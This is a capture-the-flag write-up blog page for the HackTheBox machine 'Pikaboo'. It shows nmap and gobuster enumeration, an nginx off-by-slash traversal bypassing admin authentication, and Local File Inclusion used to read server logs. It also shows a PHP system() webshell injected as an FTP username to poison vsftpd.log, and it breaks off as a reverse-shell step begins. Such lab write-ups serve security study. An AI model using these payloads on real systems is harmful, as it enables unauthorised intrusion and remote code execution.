<!DOCTYPE html><html lang="en" dir="auto"><head><meta charset="utf-8"/><meta http-equiv="x-ua-compatible" content="IE=edge"/><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"/><meta name="robots" content="index, follow"/><title>HackTheBox Writeup: Pikaboo | Zebra</title><meta name="keywords" content="cybersecurity,ctf,linux,hackthebox"/><meta name="description" content="In this machine I learned about `nginx` misconfigurations, `LDAP` enumeration, log poisoning and `perl` command injections."/><meta name="author" content="Zebra"/><link rel="canonical" href="https://xzebra.dev/blog/hackthebox_writeup_pikaboo/"/><link crossorigin="anonymous" href="/assets/css/stylesheet.523aabfa2b5ee217ac92d035cb44bf463d5d30a14b08f7aa59ccfdbebf4501f8.css" integrity="sha256-Ujqr+ite4hesktA1y0S/Rj1dMKFLCPeqWcz9vr9FAfg=" rel="preload stylesheet" as="style"/><script defer="" crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload="hljs.initHighlightingOnLoad()"></script>
<link rel="icon" href="https://xzebra.dev/images/favicon.ico"/><link rel="icon" type="image/png" sizes="16x16" href="https://xzebra.dev/images/favicon-16x16.png"/><link rel="icon" type="image/png" sizes="32x32" href="https://xzebra.dev/images/favicon-32x32.png"/><link rel="apple-touch-icon" href="https://xzebra.dev/images/apple-touch-icon.png"/><link rel="mask-icon" href="https://xzebra.dev/safari-pinned-tab.svg"/><meta name="msapplication-TileColor" content="#2e2e33"/><link rel="alternate" hreflang="en" href="https://xzebra.dev/blog/hackthebox_writeup_pikaboo/"/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HackTheBox Writeup: Pikaboo"/><meta property="og:description" content="In this machine I learned about `nginx` misconfigurations, `LDAP` enumeration, log poisoning and `perl` command injections."/><meta property="og:type" content="article"/><meta property="og:url" content="https://xzebra.dev/blog/hackthebox_writeup_pikaboo/"/><meta property="og:image" content="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_tQtwzne.png"/><meta property="article:section" content="blog"/><meta property="article:published_time" content="2021-11-17T22:57:00+07:00"/><meta property="article:modified_time" content="2023-05-13T11:16:00+07:00"/><meta property="og:site_name" content="Zebra"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_earlyaccess/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_developer/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_unicode/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_backdoor/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_shibboleth/"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:image" content="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_tQtwzne.png"/><meta name="twitter:title" content="HackTheBox Writeup: Pikaboo"/><meta name="twitter:description" content="In this machine I learned about `nginx` misconfigurations, `LDAP` enumeration, log poisoning and `perl` command injections."/><script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blog","item":"https://xzebra.dev/blog/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeup: Pikaboo","item":"https://xzebra.dev/blog/hackthebox_writeup_pikaboo/"}]}</script><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox Writeup: Pikaboo","name":"HackTheBox Writeup: Pikaboo","description":"In this machine I learned about `nginx` misconfigurations, `LDAP` enumeration, log poisoning and `perl` command injections.","keywords":["cybersecurity","ctf","linux","hackthebox"],"articleBody":"Enumeration sudo nmap -sC -sS -sV -F 10.10.10.249 \u003escan.txt Starting Nmap 7.92 ( ) at 2021-11-17 20:14 EET Nmap scan report for 10.10.10.249 Host is up (0.069s latency). Not shown: 97 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA) | 256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA) |_ 256 f4💿6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519) 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Pikaboo Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at . Nmap done: 1 IP address (1 host up) scanned in 9.92 seconds There is a website on port 80 and an ftp server. Those may be access points.\nIn the website, there is an exposed admin section, which requires credentials.\nI tried sqlmap on http://10.10.10.249/pokeapi.php?id=1 with no results. If we run an nmap vulnerabilities scan\nnmap -sV -A --script vuln 10.10.10.249 we get a lot of admin pages that require authentication.\n80/tcp open http nginx 1.14.2 | http-enum: | /admin/: Possible admin folder (401 Unauthorized) | /admin/admin/: Possible admin folder (401 Unauthorized) | /administrator/: Possible admin folder (401 Unauthorized) | /adminarea/: Possible admin folder (401 Unauthorized) | /adminLogin/: Possible admin folder (401 Unauthorized) | /admin_area/: Possible admin folder (401 Unauthorized) | /administratorlogin/: Possible admin folder (401 Unauthorized) | /admin/account.php: Possible admin folder (401 Unauthorized) | /admin/index.php: Possible admin folder (401 Unauthorized) | /admin/login.php: Possible admin folder (401 Unauthorized) | /admin/admin.php: Possible admin folder (401 Unauthorized) | /admin_area/admin.php: Possible admin folder (401 Unauthorized) Getting the foothold I guess nobody adds this much pages, so it must be some configuration of htaccess or nginx to require login on admin* pages. If we investigate more, we can guess it may be caused by an Off-By-Slash misconfiguration of nginx:\nIt may look like the following:\nlocation /admin { alias /usr/share/nginx/admin/; } Nginx will parse until finding /admin, which means a request like /administrator/ is resolved as /usr/share/nginx/admin/istrator/.\nBy knowing that, we can easily exploit this misconfiguration, by traversing the path, with /admin../. If we request the page, we will get a Forbidden response. This means we have bypassed the authentication.\n\u003c!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"\u003e \u003chtml\u003e\u003chead\u003e \u003ctitle\u003e403 Forbidden\u003c/title\u003e \u003c/head\u003e\u003cbody\u003e \u003ch1\u003eForbidden\u003c/h1\u003e \u003cp\u003eYou don't have permission to access this resource.\u003c/p\u003e \u003chr\u003e \u003caddress\u003eApache/2.4.38 (Debian) Server at 127.0.0.1 Port 81\u003c/address\u003e \u003c/body\u003e\u003c/html\u003e Now we now we can traverse directories. Although, we are still not able to access admin page by doing /admin../admin/, so we can try fuzzing for finding other access points, such as config files or things like that.\ngobuster fuzz -w /usr/share/dirbuster/directory-list-lowercase-2.3-medium.txt -u -b 404 We get some hits!\n=============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/dirbuster/directory-list-lowercase-2.3-medium.txt [+] Excluded Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2021/11/17 20:59:05 Starting gobuster in fuzzing mode =============================================================== Found: [Status=401] [Length=456] Found: [Status=301] [Length=314] Found: [Status=200] [Length=4617] We can access the server-status page, which gives us information about the Apache server.\nSrv PID Acc M CPU SS Req Conn Child Slot Client VHost Request 0-1 684 0/11394/11394 _ 2.29 0 0 0.0 7.11 7.11 127.0.0.1 localhost:81 GET /admin_staging HTTP/1.1 1-1 685 0/11351/11351 _ 2.26 0 0 0.0 6.61 6.61 127.0.0.1 localhost:81 GET /admin/../edelstein HTTP/1.0 2-1 686 0/11470/11470 _ 2.30 0 0 0.0 6.99 6.99 127.0.0.1 localhost:81 GET /admin/../buy_tramadol HTTP/1.0 3-1 687 0/11318/11318 W 2.25 0 0 0.0 7.35 7.35 127.0.0.1 localhost:81 GET /admin/../server-status HTTP/1.0 4-1 688 0/11404/11404 _ 2.25 0 0 0.0 6.64 6.64 127.0.0.1 localhost:81 GET /admin/../2172540 HTTP/1.0 5-1 27860 0/10826/10826 _ 2.27 0 0 0.0 7.11 7.11 127.0.0.1 localhost:81 GET /admin/../005771 HTTP/1.0 6-1 16053 0/8101/8101 _ 1.56 0 0 0.0 4.45 4.45 127.0.0.1 localhost:81 GET /admin/../lookbook HTTP/1.0 7-1 17107 0/5713/5713 _ 1.09 0 0 0.0 3.20 3.20 127.0.0.1 localhost:81 GET /admin/../skincare HTTP/1.0 We can see more endpoints, such as admin_staging. If we try http://10.10.10.249/admin../admin_staging/, we get to an admin dashboard!\nThe page seems useless, as you can’t interact with anything, and the user profile form does not change anything. Although, if you pay attention to the url, you will see the pages are loaded by php file: [http://10.10.10.249/admin](http://10.10.10.249/admin)``../admin_staging/index.php?page=dashboard.php\nGetting the user flag The page seems to be vulnerable to Local File Inclusion (LFI). We can fuzz the page parameter with linux paths.\ngobuster fuzz -w /usr/share/dirbuster/vulns/file_inclusion_linux.txt -u ","wordCount":"1892","inLanguage":"en","image":"https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_tQtwzne.png","datePublished":"2021-11-17T22:57:00+07:00","dateModified":"2023-05-13T11:16:00+07:00","author":{"@type":"Person","name":"Zebra"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://xzebra.dev/blog/hackthebox_writeup_pikaboo/"},"publisher":{"@type":"Organization","name":"Zebra","logo":{"@type":"ImageObject","url":"https://xzebra.dev/images/favicon.ico"}}}</script></head><body id="top"><header class="header"><nav class="nav"><ul id="menu" style="margin-left:auto"><li><a href="https://xzebra.dev/" title="whoami"><span>whoami</span></a></li><li><a href="https://xzebra.dev/blog/" title="blog"><span>blog</span></a></li><li><a href="https://xzebra.dev/apps/" title="apps"><span>apps</span></a></li></ul></nav></header><main class="main"><article class="post-single"><header class="post-header"><h1 class="post-title">HackTheBox Writeup: Pikaboo</h1><div><ul class="post-series"><span class="secondary-text">This post belongs to this series:</span><li><a rel="noopener noreferrer" href="https://xzebra.dev/series/hackthebox/" class="link-highlight" style="--highlight-color:#9fef00">HackTheBox Machines</a></li></ul></div><div class="post-description">In this machine I learned about <code>nginx</code> misconfigurations, <code>LDAP</code> enumeration, log poisoning and <code>perl</code> command injections.</div><div class="post-meta"><span title="2021-11-17 22:57:00 +0700 +0700">November 17, 2021</span> · 9 min · Zebra</div></header><figure class="entry-cover"><img loading="lazy" src="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_tQtwzne.png" alt=""/></figure><div class="post-content"><h1 id="enumeration">Enumeration<a hidden="" class="anchor" aria-hidden="true" href="#enumeration">#</a></h1><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>sudo nmap -sC -sS -sV -F 10.10.10.249 &gt;scan.txt
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> &lt;https://nmap.org&gt; <span style="color:#f92672">)</span> at 2021-11-17 20:14 EET
</span></span><span style="display:flex"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.249
</span></span><span style="display:flex"><span>Host is up <span style="color:#f92672">(</span>0.069s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex"><span>Not shown: <span style="color:#ae81ff">97</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex"><span>21/tcp open  ftp     vsftpd 3.0.3
</span></span><span style="display:flex"><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>| ssh-hostkey:
</span></span><span style="display:flex"><span>|   <span style="color:#ae81ff">2048</span> 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|   <span style="color:#ae81ff">256</span> 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|_  <span style="color:#ae81ff">256</span> f4💿6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>80/tcp open  http    nginx 1.14.2
</span></span><span style="display:flex"><span>|_http-server-header: nginx/1.14.2
</span></span><span style="display:flex"><span>|_http-title: Pikaboo
</span></span><span style="display:flex"><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .
</span></span><span style="display:flex"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 9.92 seconds
</span></span></code></pre></div><p>There is a website on port 80 and an ftp server. Those may be access
points.</p><p>In the website, there is an exposed admin section, which requires
credentials.</p><p>I tried sqlmap on <a href="http://10.10.10.249/pokeapi.php?id=1">http://10.10.10.249/pokeapi.php?id=1</a> with no
results. If we run an nmap vulnerabilities scan</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>nmap -sV -A --script vuln 10.10.10.249
</span></span></code></pre></div><p>we get a lot of admin pages that require authentication.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>80/tcp open  http    nginx 1.14.2
</span></span><span style="display:flex"><span>| http-enum:
</span></span><span style="display:flex"><span>|   /admin/: Possible admin folder <span style="color:#f92672">(</span><span style="color:#ae81ff">401</span> Unauthorized<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|   /admin/admin/: Possible admin folder <span style="color:#f92672">(</span><span style="color:#ae81ff">401</span> Unauthorized<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|   /administrator/: Possible admin folder <span style="color:#f92672">(</span><span style="color:#ae81ff">401</span> Unauthorized<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|   /adminarea/: Possible admin folder <span style="color:#f92672">(</span><span style="color:#ae81ff">401</span> Unauthorized<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|   /adminLogin/: Possible admin folder <span style="color:#f92672">(</span><span style="color:#ae81ff">401</span> Unauthorized<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|   /admin_area/: Possible admin folder <span style="color:#f92672">(</span><span style="color:#ae81ff">401</span> Unauthorized<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|   /administratorlogin/: Possible admin folder <span style="color:#f92672">(</span><span style="color:#ae81ff">401</span> Unauthorized<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|   /admin/account.php: Possible admin folder <span style="color:#f92672">(</span><span style="color:#ae81ff">401</span> Unauthorized<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|   /admin/index.php: Possible admin folder <span style="color:#f92672">(</span><span style="color:#ae81ff">401</span> Unauthorized<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|   /admin/login.php: Possible admin folder <span style="color:#f92672">(</span><span style="color:#ae81ff">401</span> Unauthorized<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|   /admin/admin.php: Possible admin folder <span style="color:#f92672">(</span><span style="color:#ae81ff">401</span> Unauthorized<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|   /admin_area/admin.php: Possible admin folder <span style="color:#f92672">(</span><span style="color:#ae81ff">401</span> Unauthorized<span style="color:#f92672">)</span>
</span></span></code></pre></div><h1 id="getting-the-foothold">Getting the foothold<a hidden="" class="anchor" aria-hidden="true" href="#getting-the-foothold">#</a></h1><p>I guess nobody adds this much pages, so it must be some configuration of
htaccess or nginx to require login on <code>admin*</code> pages. If we investigate
more, we can guess it may be caused by an <em>Off-By-Slash</em>
misconfiguration of nginx:</p><p>It may look like the following:</p><pre tabindex="0"><code>location /admin {
        alias /usr/share/nginx/admin/;
}
</code></pre><p>Nginx will parse until finding <code>/admin</code>, which means a request like
<code>/administrator/</code> is resolved as <code>/usr/share/nginx/admin/istrator/</code>.</p><p>By knowing that, we can easily exploit this misconfiguration, by
traversing the path, with <code>/admin../</code>. If we request the page, we will
get a <em>Forbidden</em> response. This means we have bypassed the
authentication.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="display:flex"><span><span style="color:#75715e">&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;</span>
</span></span><span style="display:flex"><span>&lt;<span style="color:#f92672">html</span>&gt;&lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex"><span>&lt;<span style="color:#f92672">title</span>&gt;403 Forbidden&lt;/<span style="color:#f92672">title</span>&gt;
</span></span><span style="display:flex"><span>&lt;/<span style="color:#f92672">head</span>&gt;&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex"><span>&lt;<span style="color:#f92672">h1</span>&gt;Forbidden&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex"><span>&lt;<span style="color:#f92672">p</span>&gt;You don&#39;t have permission to access this resource.&lt;/<span style="color:#f92672">p</span>&gt;
</span></span><span style="display:flex"><span>&lt;<span style="color:#f92672">hr</span>&gt;
</span></span><span style="display:flex"><span>&lt;<span style="color:#f92672">address</span>&gt;Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 81&lt;/<span style="color:#f92672">address</span>&gt;
</span></span><span style="display:flex"><span>&lt;/<span style="color:#f92672">body</span>&gt;&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>Now we now we can traverse directories. Although, we are still not able
to access admin page by doing <code>/admin../admin/</code>, so we can try fuzzing
for finding other access points, such as config files or things like
that.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>gobuster fuzz -w /usr/share/dirbuster/directory-list-lowercase-2.3-medium.txt -u &lt;http://10.10.10.249/admin../FUZZ&gt; -b <span style="color:#ae81ff">404</span>
</span></span></code></pre></div><p>We get some hits!</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span>Gobuster v3.1.0
</span></span><span style="display:flex"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     &lt;http://10.10.10.249/admin../FUZZ&gt;
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/dirbuster/directory-list-lowercase-2.3-medium.txt
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Excluded Status codes:   <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
</span></span><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span>2021/11/17 20:59:05 Starting gobuster in fuzzing mode
</span></span><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span>Found: <span style="color:#f92672">[</span>Status<span style="color:#f92672">=</span>401<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Length<span style="color:#f92672">=</span>456<span style="color:#f92672">]</span> &lt;http://10.10.10.249/admin../admin&gt;
</span></span><span style="display:flex"><span>Found: <span style="color:#f92672">[</span>Status<span style="color:#f92672">=</span>301<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Length<span style="color:#f92672">=</span>314<span style="color:#f92672">]</span> &lt;http://10.10.10.249/admin../javascript&gt;
</span></span><span style="display:flex"><span>Found: <span style="color:#f92672">[</span>Status<span style="color:#f92672">=</span>200<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Length<span style="color:#f92672">=</span>4617<span style="color:#f92672">]</span> &lt;http://10.10.10.249/admin../server-status&gt;
</span></span></code></pre></div><p>We can access the <code>server-status</code> page, which gives us information about
the Apache server.</p><pre tabindex="0"><code>Srv PID Acc M   CPU SS  Req Conn    Child   Slot    Client  VHost   Request
0-1 684 0/11394/11394   _   2.29    0   0   0.0 7.11    7.11    127.0.0.1   localhost:81    GET /admin_staging HTTP/1.1
1-1 685 0/11351/11351   _   2.26    0   0   0.0 6.61    6.61    127.0.0.1   localhost:81    GET /admin/../edelstein HTTP/1.0
2-1 686 0/11470/11470   _   2.30    0   0   0.0 6.99    6.99    127.0.0.1   localhost:81    GET /admin/../buy_tramadol HTTP/1.0
3-1 687 0/11318/11318   W   2.25    0   0   0.0 7.35    7.35    127.0.0.1   localhost:81    GET /admin/../server-status HTTP/1.0
4-1 688 0/11404/11404   _   2.25    0   0   0.0 6.64    6.64    127.0.0.1   localhost:81    GET /admin/../2172540 HTTP/1.0
5-1 27860   0/10826/10826   _   2.27    0   0   0.0 7.11    7.11    127.0.0.1   localhost:81    GET /admin/../005771 HTTP/1.0
6-1 16053   0/8101/8101 _   1.56    0   0   0.0 4.45    4.45    127.0.0.1   localhost:81    GET /admin/../lookbook HTTP/1.0
7-1 17107   0/5713/5713 _   1.09    0   0   0.0 3.20    3.20    127.0.0.1   localhost:81    GET /admin/../skincare HTTP/1.0
</code></pre><p>We can see more endpoints, such as <code>admin_staging</code>. If we try
<a href="http://10.10.10.249/admin../admin_staging/">http://10.10.10.249/admin../admin_staging/</a>, we get to an
<strong>admin dashboard</strong>!</p><p>The page seems useless, as you can’t interact with anything, and the
user profile form does not change anything. Although, if you pay
attention to the url, you will see the pages are loaded by php file:
<code>[http://10.10.10.249/admin](http://10.10.10.249/admin)``../admin_staging/index.php?page=dashboard.php</code></p><h1 id="getting-the-user-flag">Getting the user flag<a hidden="" class="anchor" aria-hidden="true" href="#getting-the-user-flag">#</a></h1><p>The page seems to be vulnerable to <em>Local File Inclusion</em> (LFI). We can
fuzz the <code>page</code> parameter with linux paths.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>gobuster fuzz -w /usr/share/dirbuster/vulns/file_inclusion_linux.txt -u &lt;http://10.10.10.249/admin../admin_staging/index.php<span style="color:#ae81ff">\\</span>?page<span style="color:#ae81ff">\\</span><span style="color:#f92672">=</span>/FUZZ&gt; --exclude-length <span style="color:#ae81ff">15349</span> -b <span style="color:#ae81ff">400</span>
</span></span></code></pre></div><p>And we get some interesting files:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span>Gobuster v3.1.0
</span></span><span style="display:flex"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     &lt;http://10.10.10.249/admin../admin_staging/index.php?page<span style="color:#f92672">=</span>/FUZZ&gt;
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/dirbuster/vulns/file_inclusion_linux.txt
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Excluded Status codes:   <span style="color:#ae81ff">400</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Exclude Length:          <span style="color:#ae81ff">15349</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
</span></span><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span>2021/11/17 21:41:29 Starting gobuster in fuzzing mode
</span></span><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span>Found: <span style="color:#f92672">[</span>Status<span style="color:#f92672">=</span>200<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Length<span style="color:#f92672">=</span>47381<span style="color:#f92672">]</span> &lt;http://10.10.10.249/admin../admin_staging/index.php?page<span style="color:#f92672">=</span>//var/log/faillog&gt;
</span></span><span style="display:flex"><span>Found: <span style="color:#f92672">[</span>Status<span style="color:#f92672">=</span>200<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Length<span style="color:#f92672">=</span>307641<span style="color:#f92672">]</span> &lt;http://10.10.10.249/admin../admin_staging/index.php?page<span style="color:#f92672">=</span>//var/log/lastlog&gt;
</span></span><span style="display:flex"><span>Found: <span style="color:#f92672">[</span>Status<span style="color:#f92672">=</span>200<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Length<span style="color:#f92672">=</span>19803<span style="color:#f92672">]</span> &lt;http://10.10.10.249/admin../admin_staging/index.php?page<span style="color:#f92672">=</span>//var/log/vsftpd.log&gt;
</span></span><span style="display:flex"><span>Found: <span style="color:#f92672">[</span>Status<span style="color:#f92672">=</span>200<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Length<span style="color:#f92672">=</span>169717<span style="color:#f92672">]</span> &lt;http://10.10.10.249/admin../admin_staging/index.php?page<span style="color:#f92672">=</span>//var/log/wtmp&gt;
</span></span></code></pre></div><p>We can see some logs in <code>vsftpd.log</code>. This file stores all the login
attempts for the ftp server. Pages are rendered by php, so we can try
<em>Log Poisoning</em>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>ftp 10.10.10.249
</span></span><span style="display:flex"><span>Connected to 10.10.10.249.
</span></span><span style="display:flex"><span><span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 3.0.3<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>Name <span style="color:#f92672">(</span>10.10.10.249:zebra<span style="color:#f92672">)</span>: <span style="color:#e6db74">&#39;&lt;?php system($_GET[&#39;</span>c<span style="color:#e6db74">&#39;]); ?&gt;&#39;</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">331</span> Please specify the password.
</span></span><span style="display:flex"><span>Password:
</span></span><span style="display:flex"><span><span style="color:#ae81ff">530</span> Login incorrect.
</span></span><span style="display:flex"><span>ftp: Login failed.
</span></span><span style="display:flex"><span>ftp&gt;
</span></span></code></pre></div><p>This will create an entry in the file with the php code as name, so it
will be executed. We can run commands with the following:
<code>?page=//var/log/vsftpd.log&amp;c=ifconfig</code>.</p><p>We can create a reverse shell adding another poison entry with the
following command:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>ftp 10.10.10.249
</span></span><span style="display:flex"><span>Connected to 10.10.10.249.
</span></span><span style="display:flex"><span><span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 3.0.3<span style="color:#f92672">)</span>
